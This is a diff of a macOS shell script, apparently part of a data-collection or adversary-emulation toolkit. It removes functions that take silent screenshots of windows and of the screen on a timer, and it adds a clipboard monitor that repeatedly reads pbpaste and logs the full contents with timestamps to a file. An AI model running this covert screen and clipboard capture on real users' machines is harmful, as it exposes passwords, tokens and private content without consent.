-            screencapture -x -l "$window_id" "$output_path" 2>/dev/null
-            
-            if [ -f "$output_path" ]; then
-                file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
-                printf "APP_SCREENSHOT|captured|Window %s (%s): %s (%s bytes)\\n" "$window_id" "$window_name" "$output_path" "$file_size"
-                captured_count=$((captured_count + 1))
-            fi
-        fi
-    done
-    
-    printf "APP_SCREENSHOT|summary|Captured %d application windows\\n" "$captured_count"
-} 
-
-# Function: capture_screen_single
-# Type: main
-# Languages: shell
-FUNCTION_LANG="shell"
-# Sudo privileges: Not required
-
-capture_screen_single() {
-    local timestamp=$(date '+%Y%m%d_%H%M%S')
-    local output_file="/tmp/screen_capture_${timestamp}.png"
-    
-    $CMD_PRINTF "SCREEN_CAPTURE|SINGLE|Capturing screen to %s\n" "$output_file"
-    
-    # Capture screen using screencapture command
-    if $CMD_SCREENCAPTURE -x "$output_file" 2>/dev/null; then
-        local file_size=$(stat -f%z "$output_file" 2>/dev/null || echo "0")
-        $CMD_PRINTF "SCREEN_CAPTURE|SUCCESS|File: %s Size: %s bytes\n" "$output_file" "$file_size"
-    else
-        $CMD_PRINTF "SCREEN_CAPTURE|ERROR|Failed to capture screen\n"
-        return 1
-    fi
-    
     return 0
 }
 
 
-# Function: capture_screen_timed
+# Function: collect_clipboard_monitor
 # Type: main
 # Languages: shell
 FUNCTION_LANG="shell"
 # Sudo privileges: Not required
 
-capture_screen_timed() {
-    local duration="${DURATION_ARG:-$DEFAULT_DURATION}"
-    local interval="${INTERVAL_ARG:-$DEFAULT_INTERVAL}"
-    
-    $CMD_PRINTF "SCREEN_CAPTURE|TIMED|Starting timed capture for %s seconds at %s second intervals\n" "$duration" "$interval"
-    
-    local end_time=$(($(date +%s) + duration))
-    local capture_count=0
-    
-    while [ $(date +%s) -lt $end_time ]; do
-        local timestamp=$(date '+%Y%m%d_%H%M%S')
-        local output_file="/tmp/screen_capture_${timestamp}.png"
-        
-        if $CMD_SCREENCAPTURE -x "$output_file" 2>/dev/null; then
-            capture_count=$((capture_count + 1))
-            local file_size=$(stat -f%z "$output_file" 2>/dev/null || echo "0")
-            $CMD_PRINTF "SCREEN_CAPTURE|%d|File: %s Size: %s bytes\n" "$capture_count" "$output_file" "$file_size"
-        else
-            $CMD_PRINTF "SCREEN_CAPTURE|ERROR|Failed to capture screen at interval %d\n" "$capture_count"
+collect_clipboard_monitor() {
+    _p_bad=false
+    case "$INPUT_INTERVAL" in ''|*[!0-9]*) _p_bad=true ;; esac
+    case "$INPUT_COUNT" in ''|*[!0-9]*) _p_bad=true ;; esac
+    if [ "$_p_bad" = false ]; then
+        [ "$INPUT_INTERVAL" -lt 1 ] && _p_bad=true
+        [ "$INPUT_COUNT" -lt 1 ] && _p_bad=true
+    fi
+    if [ "$_p_bad" = true ]; then
+        $CMD_PRINTF "ERROR|pbpaste|monitor needs positive integers (--interval and --count; default 10 each)\n"
+        return 1
+    fi
+    $CMD_PRINTF "PBPASTE|mode|monitor|pid|%s|interval_s|%s|count|%s|foreground|true\n" "$$" "$INPUT_INTERVAL" "$INPUT_COUNT"
+    _p_i=0
+    while [ "$_p_i" -lt "$INPUT_COUNT" ]; do
+        _p_i=$((_p_i + 1))
+        _p_ts=$("$CMD_DATE" '+%Y-%m-%dT%H:%M:%S%z' 2>/dev/null) || _p_ts=$("$CMD_DATE" '+%Y-%m-%d %H:%M:%S')
+        _p_line=$("$CMD_PBPASTE" 2>&1) || true
+        _p_bytes=$(printf '%s' "$_p_line" | "$CMD_WC" -c | "$CMD_TR" -d ' ')
+        $CMD_PRINTF "PBPASTE|sample|%s|%s|bytes|%s|text|%s\n" "$_p_i" "$_p_ts" "$_p_bytes" "$_p_line"
+        if [ -n "$INPUT_PATH" ]; then
+            $CMD_PRINTF "%s\t%s\n" "$_p_ts" "$_p_line" >> "$INPUT_PATH" || $CMD_PRINTF "ERROR|pbpaste|cannot_append|%s\n" "$INPUT_PATH"
         fi
-        
-        sleep "$interval"
+        if [ "$_p_i" -lt "$INPUT_COUNT" ]; then
+            "$CMD_SLEEP" "$INPUT_INTERVAL"
+        fi
     done
-    
-    $CMD_PRINTF "SCREEN_CAPTURE|COMPLETE|Captured %d screenshots over %s seconds\n" "$capture_count" "$duration"
     return 0
 }
 
